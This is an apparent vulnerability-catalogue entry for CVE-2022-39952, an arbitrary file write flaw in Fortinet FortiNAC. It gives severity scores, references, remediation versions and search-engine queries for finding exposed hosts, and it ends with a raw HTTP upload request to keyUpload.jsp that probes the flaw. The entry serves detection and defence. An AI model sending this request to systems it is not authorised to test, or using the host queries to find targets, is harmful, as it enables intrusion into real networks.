---
layout: post
cve_id: CVE-2022-39952
title: Fortinet FortiNAC - Arbitrary File Write
pcap: true
pcap_path: /pcaps/2022/CVE-2022-39952.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-39952.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: critical
impact: 'Successful exploitation of this vulnerability could lead to unauthorized
  access, data loss.

  '
remediation: Upgrade to 9.4.1, 9.2.6, 9.2.6, 9.1.8, 7.2.0 or above.
reference:
- https://fortiguard.com/psirt/FG-IR-22-300
- https://www.horizon3.ai/fortinet-fortinac-cve-2022-39952-deep-dive-and-iocs/
- https://github.com/horizon3ai/CVE-2022-39952
- https://nvd.nist.gov/vuln/detail/CVE-2022-39952
- https://github.com/1f3lse/taiE
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-39952
  cwe-id: CWE-668,CWE-73
  epss-score: 0.93777
  epss-percentile: 0.99844
  cpe: cpe:2.3:a:fortinet:fortinac:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: fortinet
  product: fortinac
  shodan-query:
  - title:"FortiNAC"
  - http.title:"fortinac"
  fofa-query: title="fortinac"
  google-query: intitle:"fortinac"
tags:
- cve
- cve2022
- fortinet
- fortinac
- fileupload
- rce
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
Fortinet FortiNAC is susceptible to arbitrary file write. An external control of the file name or path can allow an attacker to execute unauthorized code or commands via specifically crafted HTTP request, thus making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations. Affected versions are 9.4.0, 9.2.0 through 9.2.5, 9.1.0 through 9.1.7, 8.8.0 through 8.8.11, 8.7.0 through 8.7.6, 8.6.0 through 8.6.5, 8.5.0 through 8.5.4, and 8.3.7.


## üåê HTTP Request
```nohighlight
POST /configWizard/keyUpload.jsp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Connection: close
Content-Length: 174
Accept: */*
Accept-Language: en
Content-Type: multipart/form-data; boundary=46396533584d694149676e46754b7541
Accept-Encoding: gzip

--46396533584d694149676e46754b7541
Content-Disposition: form-data; name="key"; filename="cuceclqp.zip"

38FC7mizhUVo5ioHQTHAPeb0w4D
--46396533584d694149676e46754b7541--
```

